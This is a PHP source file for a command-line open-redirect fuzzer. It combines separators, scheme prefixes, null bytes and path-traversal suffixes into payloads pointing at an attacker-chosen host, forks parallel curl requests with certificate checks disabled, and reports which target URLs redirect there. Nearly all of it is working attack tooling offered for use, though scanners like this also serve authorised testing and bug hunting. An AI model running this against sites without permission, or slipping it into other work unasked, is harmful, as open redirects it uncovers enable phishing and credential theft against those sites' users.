<?php

/**
 * I don't believe in license
 * You can do want you want with this program
 * - gwen -
 */

class TestOpenRedirect
{
	//$payload = victim_url + $separator + $post_separator + $parameter + $equal + $pre_prefix + $prefix + $hacker_url + $suffix;

	CONST INIT_T_SEPARATOR = ['/','//','///','\\','\\\\','\\\\\\'];

	CONST INIT_T_POST_SEPARATOR = ['','?','#','?#','%5c'];
	//CONST INIT_T_POST_SEPARATOR = [''];

	//CONST INIT_T_PARAMETER = ['','d','dest','dst','origin','out','q','redirect','r','redir','return','returnURI','return_uri','returnURL','return_url','return_to','returnTo','u','uri','url'];
	CONST INIT_T_PARAMETER = [''];

	//CONST INIT_T_PRE_PREFIX = ['',' ','%00'];
	CONST INIT_T_PRE_PREFIX = ['','%00'];

	CONST INIT_T_PREFIX = ['','hTtP:/','hTtP://','hTtP:///','/','//','///','\\','\\\\','\\\\\\'];
	//CONST INIT_T_PREFIX = ['','hTtP://'];

	CONST INIT_T_SUFFIX = ['','/','/../','%2F','/%2F','/%2F..'];
	
	/**
	 * @var integer
	 *
	 * port used
	 */
	private $port = 0;

	/**
	 * @var string
	 *
	 * target to test
	 */
	private $target = null;

	/**
	 * @var string
	 *
	 * hacker url where the redirection should end
	 */
	private $hacker = null;

	/**
	 * @var string
	 *
	 * hostS to test
	 */
	private $input_file = null;
	
	/**
	 * @var int
	 *
	 * timeout
	 */
	private $timeout = 10;

	/**
	 * @var bool
	 *
	 * follow redirection
	 */
	private $redirect = true;

	/**
	 * @var bool
	 *
	 * urlencode payloads
	 */
	private $encode = false;

	/**
	 * @var array
	 *
	 * payloads table
	 */
	private $t_payloads = null;
	
	
	private $n_child = 0;
	private $max_child = 5;
	private $sleep = 50000;
	private $t_process = [];
	private $t_signal_queue = [];
	private $cnt_notice = 500;
	

	public function getTarget() {
		return $this->target;
	}
	public function setTarget( $v ) {
		$v = trim( $v );
		if( is_file($v) ) {
			$this->input_file = $v;
			$this->target = file( $this->input_file, FILE_IGNORE_NEW_LINES|FILE_SKIP_EMPTY_LINES );
		} else {
            $this->target = [ $v ];
		}
		$this->target = array_map( function($elt){return trim($elt,' /');}, $this->target );
		return true;
	}

	
	public function getHacker() {
		return $this->hacker;
	}
	public function setHacker( $v ) {
		$hacker = strtolower( trim($v,' /') );
		$hacker = preg_replace( '#.*://#', '', $hacker );
		foreach( str_split($hacker) as $k=>$h ) {
			if( rand(0,1) ) {
				$hacker[$k] = strtoupper($h);
			}
		}
		$this->hacker = $hacker;
		return true;
	}

	
	public function getRedirect() {
		return $this->redirect;
	}
	public function setRedirect( $v ) {
		$this->redirect = (bool)$v;
		return true;
	}

	
	public function getMaxChild() {
		return $this->max_child;
	}
	public function setMaxChild( $v ) {
		$this->max_child = (int)$v;
		return true;
	}

	
	public function getTimeout() {
		return $this->timeout;
	}
	public function setTimeout( $v ) {
		$this->timeout = (int)$v;
		return true;
	}

	
	public function getEncode() {
		return $this->encode;
	}
	public function setEncode( $v ) {
		$this->encode = (bool)$v;
		return true;
	}

	
	public function getPort() {
		return $this->port;
	}
	public function setPort( $v ) {
		$this->port = (int)$v;
		return true;
	}

	
	public function getPayloads() {
		return $this->t_payloads;
	}
	public function addPayload( $p )
	{
		$this->t_payloads[] = $p;
		return true;
	}


	// http://stackoverflow.com/questions/16238510/pcntl-fork-results-in-defunct-parent-process
	// Thousand Thanks!
	private function signal_handler( $signal, $pid=null, $status=null )
	{
		// If no pid is provided, Let's wait to figure out which child process ended
		if( !$pid ){
			$pid = pcntl_waitpid( -1, $status, WNOHANG );
		}
		
		// Get all exited children
		while( $pid > 0 )
		{
			if( $pid && isset($this->t_process[$pid]) ) {
				// I don't care about exit status right now.
				//  $exitCode = pcntl_wexitstatus($status);
				//  if($exitCode != 0){
				//      echo "$pid exited with status ".$exitCode."\n";
				//  }
				// Process is finished, so remove it from the list.
				$this->n_child--;
				unset( $this->t_process[$pid] );
			}
			elseif( $pid ) {
				// Job finished before the parent process could record it as launched.
				// Store it to handle when the parent process is ready
				$this->t_signal_queue[$pid] = $status;
			}
			
			$pid = pcntl_waitpid( -1, $status, WNOHANG );
		}
		
		return true;
	}


	public function run()
	{
		echo "\n";
		
		$n_payloads = $this->preparePayloads();
		if( !$n_payloads ) {
			exit( "No payloads configured!\n" );
		}
		
		file_put_contents( 'php://stderr', sprintf("Hacker: %s\n\n", $this->hacker) );
		
		echo "Testing ".$n_payloads." payloads on ".count($this->target)." target...\n\n";
		
		posix_setsid();
		declare( ticks=1 );
		//pcntl_signal( SIGHUP,  array($this,'signal_handler') );
		//pcntl_signal( SIGINT,  array($this,'signal_handler') );
		//pcntl_signal( SIGQUIT, array($this,'signal_handler') );
		//pcntl_signal( SIGABRT, array($this,'signal_handler') );
		//pcntl_signal( SIGKILL, array($this,'signal_handler') );
		//pcntl_signal( SIGIOT,  array($this,'signal_handler') );
		pcntl_signal( SIGCHLD, array($this,'signal_handler') );
		//pcntl_signal( SIGTERM, array($this,'signal_handler') );
		//pcntl_signal( SIGTSTP, array($this,'signal_handler') );
		
		$already_noticed = [];
		
		foreach( $this->target as $target )
		{
			file_put_contents( 'php://stderr', sprintf("Target: %s\n", $target) );

			$current_pointer = 0;
			$tested = $worked = 0;
			
			for( $current_pointer=0 ; $current_pointer<$n_payloads ; )
			{
				if( ($current_pointer%$this->cnt_notice) == 0 && !in_array($current_pointer,$already_noticed) ) {
					echo "Current ".$current_pointer."...\n";
					$already_noticed[] = $current_pointer;
				}
				
				if( $this->n_child < $this->max_child )
				{
					$pid = pcntl_fork();
					
					if( $pid == -1 ) {
						// fork error
					} elseif( $pid ) {
						// father
						$this->n_child++;
						$current_pointer++;
						$this->t_process[$pid] = uniqid();
				        if( isset($this->t_signal_queue[$pid]) ){
				        	$this->signal_handler( SIGCHLD, $pid, $this->t_signal_queue[$pid] );
				        	unset( $this->t_signal_queue[$pid] );
				        }
					} else {
						// child process
						$tested++;
						$r = $this->request( $this->t_payloads[$current_pointer] );
						if( $r ) {
							$worked++;
							echo "Open redirect found -> ".$this->t_payloads[$current_pointer]."\n";
						}
						exit( 0 );
					}
				}

				usleep( $this->sleep );
			}

			echo "\n";
		}

		echo "\nEnd reached.\n";
	}
	
	
	private function request( $url )
	{
		//echo $url."\n";

		$c = curl_init();
		curl_setopt( $c, CURLOPT_URL, $url );
		curl_setopt( $c, CURLOPT_CONNECTTIMEOUT, $this->timeout );
		curl_setopt( $c, CURLOPT_FOLLOWLOCATION, true );
		curl_setopt( $c, CURLOPT_RETURNTRANSFER, false );
		curl_setopt( $c, CURLOPT_SSL_VERIFYPEER, false );
		curl_exec( $c );
		$t_info = curl_getinfo( $c );
		//var_dump( $t_info );
		curl_close( $c );
	
		$t_url = parse_url( $t_info['url'] );
		//var_dump( $t_url );
	
		if( $t_info['redirect_count'] && strtolower($t_url['host']) == strtolower($this->hacker) ) {
			return true;
		} else {
			return false;
		}
	}
	

	private function preparePayloads()
	{
		$n = 0;
		$t_separator      = self::INIT_T_SEPARATOR;
		$t_post_separator = self::INIT_T_POST_SEPARATOR;
		$t_pre_prefix     = self::INIT_T_PRE_PREFIX;
		$t_prefix         = self::INIT_T_PREFIX;
		$t_parameter      = self::INIT_T_PARAMETER;
		$t_suffix         = self::INIT_T_SUFFIX;
	
		file_put_contents( 'php://stderr', sprintf("Separators: %d\n", count(self::INIT_T_SEPARATOR)) );
		file_put_contents( 'php://stderr', sprintf("Post separators: %d\n", count(self::INIT_T_POST_SEPARATOR)) );
		file_put_contents( 'php://stderr', sprintf("Pre prefixes: %d\n", count(self::INIT_T_PRE_PREFIX)) );
		file_put_contents( 'php://stderr', sprintf("Prefixes: %d\n", count(self::INIT_T_PREFIX)) );
		file_put_contents( 'php://stderr', sprintf("Parameters: %d\n", count(self::INIT_T_PARAMETER)) );
		file_put_contents( 'php://stderr', sprintf("Suffixes: %d\n\n", count(self::INIT_T_SUFFIX)) );
		
		foreach( $this->target as $target )
		{
			foreach( $t_separator as $separator )
			{
				foreach( $t_post_separator as $post_separator )
				{
					//if( $post_separator == '' ) {
					//	$t_parameter = [''];
					//}
			
					foreach( $t_pre_prefix as $pre_prefix )
					{
						foreach( $t_prefix as $prefix )
						{
							foreach( $t_parameter as $parameter )
							{
								foreach( $t_suffix as $suffix )
								{
									$n++;
									$equal = ($parameter == '') ? '' : '=';
									$payload = $separator . $post_separator . $parameter . $equal . $pre_prefix . $prefix . $this->hacker . $suffix;
									if( $this->encode ) {
										$payload = urlencode( urldecode($payload) );
									}
									$url = $target . $payload;
									//echo $url."\n";
									/*if( $pre_prefix != '%00' ) {
										if( ($pencode=urlencode($payload)) != $payload ) {
											$n++;
											$url = $victim . $pencode;
											echo $url."\n";
										}
									}*/
									$this->addPayload( $url );
								}
							}
						}
					}
			
					$t_parameter = SELF::INIT_T_PARAMETER;
				}
			}
		}
		
		$this->t_payloads = array_unique( $this->t_payloads );
		sort( $this->t_payloads );
		//var_dump( $this->t_payloads );
		//exit();
		$n_payloads = count( $this->t_payloads );

		return $n_payloads;
	}
}

?>
